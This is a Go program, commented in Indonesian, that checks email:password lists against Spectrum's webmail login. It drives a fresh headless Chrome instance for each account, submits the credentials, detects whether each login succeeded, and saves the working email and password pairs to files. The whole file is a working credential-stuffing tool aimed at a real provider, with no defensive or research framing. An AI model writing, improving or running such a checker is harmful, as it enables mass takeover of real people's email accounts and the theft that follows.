package main

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"

	// "github.com/chromedp/cdproto/network" // DIHAPUS - Tidak diperlukan jika intersepsi permintaan dihapus
	// "github.com/chromedp/cdproto/page"    // DIHAPUS - Tidak diperlukan secara langsung tanpa intersepsi
	"github.com/chromedp/chromedp"
)

// AccountData menyimpan informasi detail setiap akun yang diproses
type AccountData struct {
	Email       string
	Password    string
	Message     string
	Line        string
	LineNumber  int
	ProcessTime float64
}

// SpectrumChecker adalah struct utama untuk mengelola proses pengecekan
type SpectrumChecker struct {
	Headless            bool
	Delay               int
	ValidAccounts       []AccountData
	InvalidAccounts     []AccountData
	TotalProcessed      int
	TotalValid          int
	TotalInvalid        int
	LoginURL            string
	ProcessingStartTime time.Time
	ChromePath          string     // Path ke binary Chrome/Chromium
	LogFile             *os.File   // Untuk log debugging chromedp
	LogFileMutex        sync.Mutex // Mutex untuk mencegah race condition pada penulisan log
}

// NewSpectrumChecker membuat instance baru dari SpectrumChecker
func NewSpectrumChecker(headless bool, delay int) *SpectrumChecker {
	return &SpectrumChecker{
		Headless:        headless,
		Delay:           delay,
		ValidAccounts:   []AccountData{},
		InvalidAccounts: []AccountData{},
		LoginURL:        "https://webmail.spectrum.net/mail/auth",
	}
}

// checkChromeBrowser memeriksa apakah browser Chrome/Chromium terinstal
func (sc *SpectrumChecker) checkChromeBrowser() bool {
	// Daftar kemungkinan path executable Chrome/Chromium di Linux
	possiblePaths := []string{
		"/usr/bin/google-chrome",
		"/usr/bin/chromium",
		"/usr/bin/chromium-browser",
		"/opt/google/chrome/google-chrome",
		os.Getenv("CHROME_BIN"), // Check environment variable
	}

	for _, p := range possiblePaths {
		if _, err := os.Stat(p); err == nil {
			sc.ChromePath = p
			cmd := exec.Command(p, "--version")
			output, err := cmd.Output()
			if err == nil {
				fmt.Printf("✅ %s ditemukan: %s\n", filepath.Base(p), strings.TrimSpace(string(output)))
				return true
			}
		}
	}
	fmt.Println("❌ Chrome/Chromium browser tidak ditemukan di jalur umum.")
	fmt.Println("💡 Pastikan Chrome atau Chromium terinstal. Di Arch Linux, coba: sudo pacman -S chromium")
	return false
}

// createFreshBrowserInstance membuat instance browser Chrome yang baru dengan chromedp
func (sc *SpectrumChecker) createFreshBrowserInstance() (context.Context, context.CancelFunc, error) {
	// Buat direktori sementara untuk data user
	userDataDir, err := os.MkdirTemp("", "chromedp-user-data-")
	if err != nil {
		return nil, nil, fmt.Errorf("gagal membuat direktori user data sementara: %w", err)
	}

	// Konfigurasi opsi chromedp
	opts := []chromedp.ExecAllocatorOption{
		chromedp.NoFirstRun,
		chromedp.NoDefaultBrowserCheck,
		chromedp.DisableGPU,
		chromedp.IgnoreCertErrors,
		chromedp.WindowSize(1280, 720), // Ukuran jendela lebih kecil
		chromedp.UserAgent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
		chromedp.Flag("incognito", true), // Gunakan mode incognito
		chromedp.Flag("disable-extensions", true),
		chromedp.Flag("disable-plugins", true),
		chromedp.Flag("disable-background-timer-throttling", true),
		chromedp.Flag("disable-backgrounding-occluded-windows", true),
		chromedp.Flag("disable-renderer-backgrounding", true),
		chromedp.Flag("disable-default-apps", true),
		chromedp.Flag("aggressive-cache-discard", true),
		chromedp.Flag("disable-background-networking", true),
		chromedp.Flag("disable-sync", true),
		chromedp.Flag("disable-translate", true),
		chromedp.Flag("disable-plugins-discovery", true),
		chromedp.Flag("disable-preconnect", true),
		chromedp.Flag("log-level", "3"), // Lebih sedikit log Chrome
		chromedp.Flag("silent", true),   // Lebih sedikit log Chrome
		chromedp.UserDataDir(userDataDir), // Gunakan direktori user data sementara
	}

	if sc.Headless {
		opts = append(opts, chromedp.Headless)
		opts = append(opts, chromedp.Flag("headless=new", true)) // Untuk versi Chrome terbaru
	}

	// Tentukan jalur executable Chrome/Chromium (menggunakan chromedp.ExecPath)
	if sc.ChromePath != "" {
		opts = append(opts, chromedp.ExecPath(sc.ChromePath))
	}

	allocCtx, cancelAlloc := chromedp.NewExecAllocator(context.Background(), opts...)

	// Buat konteks chromedp baru
	ctx, cancelCtx := chromedp.NewContext(allocCtx)

	// Tambahkan log debugger ke file (hanya jika belum diinisialisasi)
	sc.LogFileMutex.Lock()
	if sc.LogFile == nil {
		var err error
		logFileName := fmt.Sprintf("chromedp_debug_%s.log", time.Now().Format("20060102_150405"))
		sc.LogFile, err = os.Create(logFileName)
		if err != nil {
			log.Printf("Gagal membuat file log: %v", err)
		} else {
			log.SetOutput(sc.LogFile)
			log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
			fmt.Printf("📝 Log debugging Chromedp akan ditulis ke: %s\n", logFileName)
		}
	}
	sc.LogFileMutex.Unlock()

	// Clean up user data directory when context is done
	go func() {
		<-ctx.Done()
		if userDataDir != "" {
			os.RemoveAll(userDataDir)
		}
	}()

	return ctx, func() {
		cancelCtx()
		cancelAlloc() // Penting untuk menutup browser process
	}, nil
}

// ultraFastDetection melakukan deteksi cepat status login
func (sc *SpectrumChecker) ultraFastDetection(ctx context.Context, maxWait time.Duration) (bool, string) {
	start := time.Now()
	checkInterval := 300 * time.Millisecond // Cek setiap 300ms

	fmt.Printf("⚡ Deteksi cepat dimulai (max %s)\n", maxWait)

	for time.Since(start) < maxWait {
		var currentURL string
		err := chromedp.Run(ctx,
			chromedp.Location(&currentURL),
		)
		if err != nil && !strings.Contains(err.Error(), "context canceled") {
			// fmt.Printf("⚠️ Deteksi error (Location): %v\n", err) // Terlalu banyak log
		}

		currentURL = strings.ToLower(currentURL)

		// FASTEST CHECK: URL-based detection
		if !strings.Contains(currentURL, "auth") && !strings.Contains(currentURL, "login") {
			if strings.Contains(currentURL, "mail") || strings.Contains(currentURL, "inbox") || strings.Contains(currentURL, "webmail") {
				if !strings.Contains(currentURL, "error") && !strings.Contains(currentURL, "invalid") {
					return true, "Login berhasil - URL redirect terdeteksi"
				}
			}
		}

		// FAST CHECK: Look for visible error/success elements
		var elCount int
		// Check for error messages
		_ = chromedp.Run(ctx,
			chromedp.Evaluate(`document.querySelectorAll("div.error, .error-message, .alert-danger, .login-error, [class*='error']").length`, &elCount),
		)
		if elCount > 0 {
			var errorText string
			_ = chromedp.Run(ctx,
				chromedp.Evaluate(`
                    let errors = document.querySelectorAll("div.error, .error-message, .alert-danger, .login-error, [class*='error']");
                    for (let i = 0; i < errors.length; i++) {
                        if (errors[i].offsetParent !== null) { // Check if element is visible
                            return errors[i].innerText;
                        }
                    }
                    return "";
                `, &errorText),
			)
			errorText = strings.ToLower(strings.TrimSpace(errorText))
			if strings.Contains(errorText, "doesn't match") || strings.Contains(errorText, "incorrect") ||
				strings.Contains(errorText, "invalid") || strings.Contains(errorText, "wrong") ||
				strings.Contains(errorText, "failed") || strings.Contains(errorText, "denied") {
				return false, fmt.Sprintf("Login gagal: %s", errorText)
			}
		}

		// Check for success indicators
		_ = chromedp.Run(ctx,
			chromedp.Evaluate(`document.querySelectorAll("#inbox, .inbox, #compose, .compose, #logout, .logout, .mail-container, [class*='inbox']").length`, &elCount),
		)
		if elCount > 0 {
			return true, fmt.Sprintf("Login berhasil - %d elemen inbox/logout terdeteksi", elCount)
		}

		// Every 1 second, do a deeper check (page source)
		if int(time.Since(start).Seconds())%1 == 0 { // Cek setiap 1 detik
			var pageSource string
			_ = chromedp.Run(ctx,
				chromedp.OuterHTML("html", &pageSource),
			)
			pageSource = strings.ToLower(pageSource)

			if strings.Contains(pageSource, "authentication failed") || strings.Contains(pageSource, "login failed") ||
				strings.Contains(pageSource, "invalid credentials") || strings.Contains(pageSource, "incorrect password") {
				return false, "Login gagal - Pola error di sumber halaman"
			}

			successIndicators := []string{"inbox", "compose", "logout", "folders"}
			successCount := 0
			for _, indicator := range successIndicators {
				if strings.Contains(pageSource, indicator) {
					successCount++
				}
			}
			if successCount >= 2 {
				return true, fmt.Sprintf("Login berhasil - %d pola sukses terdeteksi", successCount)
			}
		}

		time.Sleep(checkInterval)
	}

	// Timeout reached, final check
	var finalURL string
	_ = chromedp.Run(ctx,
		chromedp.Location(&finalURL),
	)
	finalURL = strings.ToLower(finalURL)

	if !strings.Contains(finalURL, "auth") && strings.Contains(finalURL, "mail") {
		return true, "Login berhasil - Redirect setelah timeout"
	}

	return false, "Timeout - Tidak ada respons jelas"
}

// checkSingleAccount memeriksa satu akun email:password
func (sc *SpectrumChecker) checkSingleAccount(email, password string) (bool, string) {
	fmt.Printf("🔍 Memeriksa: %s\n", email)

	ctx, cancel, err := sc.createFreshBrowserInstance()
	if err != nil {
		return false, fmt.Sprintf("Gagal membuat instance browser: %v", err)
	}
	defer func() {
		fmt.Println("🔐 Menutup instance browser...")
		cancel() // Pastikan browser ditutup
	}()

	// Atur timeout untuk seluruh operasi
	taskCtx, taskCancel := context.WithTimeout(ctx, 30*time.Second) // Global timeout per akun
	defer taskCancel()

	// ---- BAGIAN INTERSEPSI PERMINTAAN DIHAPUS UNTUK KOMPATIBILITAS VERSI LAMA ----
	// network.Enable(), page.Enable(), network.SetRequestInterceptionEnabled(true)
	// chromedp.ListenTarget(taskCtx, func(ev interface{}) { ... })
	// --------------------------------------------------------------------------------

	// Handle page load timeout
	pageLoadCtx, pageLoadCancel := context.WithTimeout(taskCtx, 15*time.Second) // Timeout navigasi
	defer pageLoadCancel()

	err = chromedp.Run(pageLoadCtx,
		chromedp.Navigate(sc.LoginURL),
	)

	if err != nil {
		if strings.Contains(err.Error(), "context deadline exceeded") {
			return false, "Timeout navigasi ke halaman login"
		}
		return false, fmt.Sprintf("Gagal navigasi ke halaman login: %v", err)
	}

	// Isi kredensial dan submit
	err = chromedp.Run(taskCtx,
		chromedp.WaitVisible(`#emailAddress`, chromedp.ByID),
		chromedp.SendKeys(`#emailAddress`, email, chromedp.ByID),
		chromedp.WaitVisible(`#emailPassword`, chromedp.ByID),
		chromedp.SendKeys(`#emailPassword`, password, chromedp.ByID),
		chromedp.Click(`#emailSubmit`, chromedp.ByID),
	)

	if err != nil {
		if strings.Contains(err.Error(), "context deadline exceeded") {
			return false, "Timeout saat mengisi atau submit form"
		}
		return false, fmt.Sprintf("Gagal interaksi form: %v", err)
	}

	fmt.Println("⏳ Login disubmit, mendeteksi respons...")
	is_valid, message := sc.ultraFastDetection(taskCtx, 20*time.Second) // Max 20 detik untuk deteksi

	return is_valid, message
}

// processFile memproses file input baris per baris
func (sc *SpectrumChecker) processFile(filename string) bool {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("❌ File '%s' tidak ditemukan atau tidak dapat dibuka: %v\n", filename, err)
		return false
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	var lines []string
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Printf("❌ Error membaca file '%s': %v\n", filename, err)
		return false
	}

	if len(lines) == 0 {
		fmt.Printf("❌ File '%s' kosong!\n", filename)
		return false
	}

	fmt.Printf("📖 Membaca file '%s' - %d baris\n", filename, len(lines))
	fmt.Println("🚀 Mode ultra optimized: Fresh browser per akun")
	fmt.Println("⚡ Setiap akun mendapatkan instance browser baru yang bersih")

	sc.ProcessingStartTime = time.Now()

	for i, line := range lines {
		lineNum := i + 1
		if !strings.Contains(line, ":") {
			fmt.Printf("⚠️ Baris %d: Format tidak valid (tidak ada ':') - %s\n", lineNum, line)
			continue
		}

		parts := strings.SplitN(line, ":", 2)
		email, password := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])

		if email == "" || password == "" {
			fmt.Printf("⚠️ Baris %d: Email atau password kosong - %s\n", lineNum, line)
			continue
		}

		accountStartTime := time.Now()
		fmt.Printf("\n📋 [%d/%d] Memproses: %s\n", lineNum, len(lines), email)

		isValid, message := sc.checkSingleAccount(email, password)

		accountProcessTime := time.Since(accountStartTime).Seconds()

		accountData := AccountData{
			Email:       email,
			Password:    password,
			Message:     message,
			Line:        line,
			LineNumber:  lineNum,
			ProcessTime: accountProcessTime,
		}

		if isValid {
			sc.ValidAccounts = append(sc.ValidAccounts, accountData)
			sc.TotalValid++
			fmt.Printf("✅ VALID: %s (⏱️ %.1fs)\n", email, accountProcessTime)
			fmt.Printf("   📧 Status: %s\n", message)
		} else {
			sc.InvalidAccounts = append(sc.InvalidAccounts, accountData)
			sc.TotalInvalid++
			fmt.Printf("❌ INVALID: %s (⏱️ %.1fs)\n", email, accountProcessTime)
			fmt.Printf("   🚫 Alasan: %s\n", message)
		}
		sc.TotalProcessed++

		// Progress info
		if sc.TotalProcessed%2 == 0 && sc.TotalProcessed < len(lines) {
			elapsedTime := time.Since(sc.ProcessingStartTime).Seconds()
			avgTime := elapsedTime / float64(sc.TotalProcessed)
			remaining := len(lines) - sc.TotalProcessed
			eta := avgTime * float64(remaining)

			fmt.Printf("📊 Progress: %d/%d - Valid: %d, Invalid: %d\n", sc.TotalProcessed, len(lines), sc.TotalValid, sc.TotalInvalid)
			fmt.Printf("⏱️ Waktu rata-rata/akun: %.1fs, ETA: %.1fmenit\n", avgTime, eta/60)
		}

		// Minimal delay between accounts
		if sc.Delay > 0 && i < len(lines)-1 { // Tidak delay setelah akun terakhir
			fmt.Printf("⏳ Delay: %ds\n", sc.Delay)
			time.Sleep(time.Duration(sc.Delay) * time.Second)
		}
	}
	return true
}

// saveResults menyimpan hasil ke file terpisah
func (sc *SpectrumChecker) saveResults() {
	timestamp := time.Now().Format("20060102_150405")

	// Save valid accounts
	if len(sc.ValidAccounts) > 0 {
		validFilename := fmt.Sprintf("spectrum_valid_%s.txt", timestamp)
		f, err := os.Create(validFilename)
		if err != nil {
			fmt.Printf("❌ Gagal membuat file valid: %v\n", err)
		} else {
			defer f.Close()
			writer := bufio.NewWriter(f)
			fmt.Fprintf(writer, "# Spectrum Valid Accounts - Ultra Optimized - %s\n", time.Now().Format("2006-01-02 15:04:05"))
			fmt.Fprintf(writer, "# Total Valid: %d accounts\n", len(sc.ValidAccounts))
			if sc.TotalProcessed > 0 {
				fmt.Fprintf(writer, "# Success Rate: %.1f%%\n", (float64(sc.TotalValid)/float64(sc.TotalProcessed))*100)
			}
			fmt.Fprintf(writer, "# Metode: Instance browser baru per akun\n")
			fmt.Fprintf(writer, "#%s\n\n", strings.Repeat("=", 70))

			for i, account := range sc.ValidAccounts {
				fmt.Fprintf(writer, "%3d. %s:%s\n", i+1, account.Email, account.Password)
				fmt.Fprintf(writer, "     Status: %s\n", account.Message)
				fmt.Fprintf(writer, "     Baris: %d\n", account.LineNumber)
				fmt.Fprintf(writer, "     Waktu Proses: %.1fs\n\n", account.ProcessTime)
			}
			writer.Flush()
			fmt.Printf("✅ Akun valid disimpan ke: %s\n", validFilename)
		}
	}

	// Save invalid accounts
	if len(sc.InvalidAccounts) > 0 {
		invalidFilename := fmt.Sprintf("spectrum_invalid_%s.txt", timestamp)
		f, err := os.Create(invalidFilename)
		if err != nil {
			fmt.Printf("❌ Gagal membuat file invalid: %v\n", err)
		} else {
			defer f.Close()
			writer := bufio.NewWriter(f)
			fmt.Fprintf(writer, "# Spectrum Invalid Accounts - Ultra Optimized - %s\n", time.Now().Format("2006-01-02 15:04:05"))
			fmt.Fprintf(writer, "# Total Invalid: %d accounts\n", len(sc.InvalidAccounts))
			fmt.Fprintf(writer, "# Metode: Instance browser baru per akun\n")
			fmt.Fprintf(writer, "#%s\n\n", strings.Repeat("=", 70))

			for i, account := range sc.InvalidAccounts {
				fmt.Fprintf(writer, "%3d. %s:%s\n", i+1, account.Email, account.Password)
				fmt.Fprintf(writer, "     Alasan: %s\n", account.Message)
				fmt.Fprintf(writer, "     Baris: %d\n", account.LineNumber)
				fmt.Fprintf(writer, "     Waktu Proses: %.1fs\n\n", account.ProcessTime)
			}
			writer.Flush()
			fmt.Printf("❌ Akun invalid disimpan ke: %s\n", invalidFilename)
		}
	}

	// Save summary
	summaryFilename := fmt.Sprintf("spectrum_summary_%s.txt", timestamp)
	f, err := os.Create(summaryFilename)
	if err != nil {
		fmt.Printf("❌ Gagal membuat file summary: %v\n", err)
	} else {
		defer f.Close()
		writer := bufio.NewWriter(f)
		fmt.Fprintf(writer, "RINGKASAN PEMERIKSA AKUN SPECTRUM - ULTRA OPTIMIZED\n")
		fmt.Fprintf(writer, "Metode: Instance Browser Baru Per Akun\n")
		fmt.Fprintf(writer, "Dibuat: %s\n", time.Now().Format("2006-01-02 15:04:05"))
		fmt.Fprintf(writer, "%s\n\n", strings.Repeat("=", 50))
		fmt.Fprintf(writer, "Total Diproses: %d\n", sc.TotalProcessed)
		fmt.Fprintf(writer, "Akun Valid: %d\n", sc.TotalValid)
		fmt.Fprintf(writer, "Akun Invalid: %d\n", sc.TotalInvalid)
		if sc.TotalProcessed > 0 {
			fmt.Fprintf(writer, "Tingkat Keberhasilan: %.1f%%\n", (float64(sc.TotalValid)/float64(sc.TotalProcessed))*100)
		}

		// Performance metrics
		totalTime := time.Since(sc.ProcessingStartTime).Seconds()
		fmt.Fprintf(writer, "\nMETRIK PERFORMA:\n")
		fmt.Fprintf(writer, "Total Waktu Pemrosesan: %.1fs\n", totalTime)
		if sc.TotalProcessed > 0 {
			fmt.Fprintf(writer, "Waktu Rata-rata per Akun: %.1fs\n", totalTime/float64(sc.TotalProcessed))
		}
		fmt.Fprintf(writer, "Optimisasi: Instance browser baru per akun\n")
		writer.Flush()
		fmt.Printf("📊 Ringkasan disimpan ke: %s\n", summaryFilename)
	}
}

// printSummary mencetak ringkasan hasil ke konsol
func (sc *SpectrumChecker) printSummary() {
	fmt.Printf("\n%s\n", strings.Repeat("=", 70))
	fmt.Println("🚀 HASIL PEMERIKSA AKUN SPECTRUM - ULTRA OPTIMIZED")
	fmt.Printf("%s\n", strings.Repeat("=", 70))
	fmt.Printf("⏱️  Selesai: %s\n", time.Now().Format("2006-01-02 15:04:05"))
	fmt.Println("🔄 Metode: Instance browser baru per akun")
	fmt.Printf("📋 Total Diproses: %d\n", sc.TotalProcessed)
	fmt.Printf("✅ Akun Valid: %d\n", sc.TotalValid)
	fmt.Printf("❌ Akun Invalid: %d\n", sc.TotalInvalid)

	if sc.TotalProcessed > 0 {
		successRate := (float64(sc.TotalValid) / float64(sc.TotalProcessed)) * 100
		fmt.Printf("📈 Tingkat Keberhasilan: %.1f%%\n", successRate)
	}

	// Show valid accounts summary
	if len(sc.ValidAccounts) > 0 {
		fmt.Println("\n📧 DETAIL AKUN VALID:")
		fmt.Printf("%s\n", strings.Repeat("-", 50))
		for i, account := range sc.ValidAccounts {
			fmt.Printf("   %2d. %s (⏱️ %.1fs)\n", i+1, account.Email, account.ProcessTime)
			fmt.Printf("       %s\n", account.Message)
		}
	}

	fmt.Println("\n🚀 Pemrosesan ultra optimized selesai!")
	fmt.Println("⚡ Strategi instance browser baru per akun memastikan kecepatan maksimum")
	fmt.Println("🔐 Setiap akun diperiksa dengan instance browser yang bersih")
	fmt.Println("📁 Periksa file output untuk hasil detail.")
}

// checkDependencies memeriksa apakah semua dependensi yang diperlukan terinstal
func checkDependencies() bool {
	fmt.Println("🔍 Memeriksa dependensi...")

	// Cek browser Chrome/Chromium
	cmd := exec.Command("which", "chromium")
	_, err := cmd.Output()
	if err != nil {
		cmd = exec.Command("which", "google-chrome")
		_, err = cmd.Output()
		if err != nil {
			fmt.Println("❌ Browser Chrome/Chromium tidak ditemukan di PATH.")
			fmt.Println("💡 Instal dengan: sudo pacman -S chromium atau sudo pacman -S google-chrome")
			return false
		}
		fmt.Println("✅ Google Chrome ditemukan.")
	} else {
		fmt.Println("✅ Chromium ditemukan.")
	}

	// Cek apakah internet terhubung (opsional, untuk memastikan situs spectrum bisa dijangkau)
	_, err = exec.Command("ping", "-c", "1", "google.com").Output()
	if err != nil {
		fmt.Println("⚠️ Koneksi internet mungkin tidak stabil atau terputus.")
		fmt.Println("   Pastikan Anda terhubung ke internet untuk mengecek akun.")
		// return false // Jangan langsung keluar, mungkin hanya masalah ping
	} else {
		fmt.Println("✅ Koneksi internet terdeteksi.")
	}

	return true
}

func main() {
	fmt.Println("🚀 SPECTRUM EMAIL ACCOUNT CHECKER - ULTRA OPTIMIZED VERSION (GOLANG)")
	fmt.Println(strings.Repeat("=", 65))
	fmt.Println("🆕 Strategi Instance Browser Baru Per Akun")
	fmt.Println("⚡ Deteksi Ultra Cepat dengan Penutupan Browser Instan")
	fmt.Println("🐧 Dioptimalkan untuk Arch Linux")
	fmt.Println(strings.Repeat("=", 65))

	// Periksa dependensi terlebih dahulu
	if !checkDependencies() {
		fmt.Println("\n❌ Silakan instal dependensi yang hilang terlebih dahulu!")
		os.Exit(1)
	}

	fmt.Println("\n✅ Semua dependensi ditemukan!")

	// Input settings
	reader := bufio.NewReader(os.Stdin)

	fmt.Print("\n📁 Nama file input (default: list.txt): ")
	inputFilename, _ := reader.ReadString('\n')
	inputFilename = strings.TrimSpace(inputFilename)
	if inputFilename == "" {
		inputFilename = "list.txt"
	}

	fmt.Print("👁️  Jalankan dalam mode headless? (y/n, default: y): ")
	headlessInput, _ := reader.ReadString('\n')
	headlessInput = strings.TrimSpace(strings.ToLower(headlessInput))
	headless := true
	if headlessInput == "n" {
		headless = false
	}

	fmt.Print("⏱️  Delay antar akun (detik, default: 1): ")
	delayInput, _ := reader.ReadString('\n')
	delayInput = strings.TrimSpace(delayInput)
	delay := 1
	if delayInput != "" {
		parsedDelay, err := fmt.Sscanf(delayInput, "%d", &delay)
		if err != nil || parsedDelay != 1 {
			fmt.Println("⚠️ Input delay tidak valid, menggunakan default 1 detik.")
			delay = 1
		}
		if delay < 0 {
			delay = 0
		}
	}

	fmt.Printf("\n⚙️  KONFIGURASI ULTRA OPTIMIZED:\n")
	fmt.Printf("   📁 File Input: %s\n", inputFilename)
	fmt.Printf("   👁️  Mode Headless: %s\n", func() string {
		if headless { return "Aktif" } else { return "Nonaktif" }
	}())
	fmt.Printf("   ⏱️  Delay antar akun: %d detik\n", delay)
	fmt.Println("   🆕 Strategi: Instance browser baru per akun")
	fmt.Println("   ⚡ Deteksi: Ultra cepat dengan penutupan instan")
	fmt.Printf("   🌐 Target: %s\n", "webmail.spectrum.net")

	// Konfirmasi
	fmt.Print("\n🚀 Mulai pengecekan ultra optimized? (y/n): ")
	confirm, _ := reader.ReadString('\n')
	confirm = strings.TrimSpace(strings.ToLower(confirm))
	if confirm != "y" {
		fmt.Println("❌ Dibatalkan oleh pengguna.")
		return
	}

	// Inisialisasi checker
	checker := NewSpectrumChecker(headless, delay)
	if !checker.checkChromeBrowser() {
		os.Exit(1) // Keluar jika browser tidak ditemukan
	}

	// Menangkap sinyal interrupt (Ctrl+C) - Dihapus karena masalah di Sandbox
	// sigChan := make(chan os.Signal, 1)
	// signal.Notify(sigChan, os.Interrupt)
	// go func() {
	// 	<-sigChan
	// 	fmt.Println("\n\n⚠️ Proses diinterupsi oleh pengguna. Menyimpan hasil parsial...")
	// 	checker.saveResults()
	// 	checker.printSummary()
	// 	os.Exit(0)
	// }()

	fmt.Printf("\n🚀 Memulai verifikasi akun ultra optimized...\n")
	fmt.Println("🆕 Setiap akun akan mendapatkan instance browser baru yang bersih")

	// Proses file
	if checker.processFile(inputFilename) {
		// Simpan hasil
		checker.saveResults()

		// Cetak ringkasan
		checker.printSummary()

		totalDuration := time.Since(checker.ProcessingStartTime).Seconds()
		fmt.Printf("\n⏱️  Total waktu eksekusi: %.1f detik\n", totalDuration)

		if checker.TotalProcessed > 0 {
			avgTime := totalDuration / float64(checker.TotalProcessed)
			fmt.Printf("⚡ Waktu rata-rata per akun: %.1f detik\n", avgTime)
			fmt.Printf("🆕 Instance browser baru yang dibuat: %d\n", checker.TotalProcessed)
		}
	} else {
		fmt.Println("❌ Gagal memproses file input!")
	}

	// Pastikan file log ditutup di akhir program
	if checker.LogFile != nil {
		checker.LogFile.Close()
	}
}

// createDemoFile untuk membuat file demo. Ini untuk penggunaan internal atau testing
func createDemoFile() {
	demoData := []string{
		"user1@spectrum.net:password123",
		"test@spectrum.net:wrongpass",
		"admin@spectrum.net:admin123",
		"demo@spectrum.net:demo456",
		"example@spectrum.net:example789",
	}

	demoFilename := "demo_list.txt"
	f, err := os.Create(demoFilename)
	if err != nil {
		fmt.Printf("Gagal membuat file demo '%s': %v\n", demoFilename, err)
		return
	}
	defer f.Close()

	for _, line := range demoData {
		f.WriteString(line + "\n")
	}

	fmt.Printf("✅ File demo '%s' berhasil dibuat!\n", demoFilename)
	fmt.Println("📋 Contoh akun demo:")
	for i, line := range demoData {
		fmt.Printf("   %d. %s\n", i+1, line)
	}
	fmt.Println("\n🚀 Jalankan dengan: go run main.go") // Sesuaikan jika nama file utama bukan main.go
}

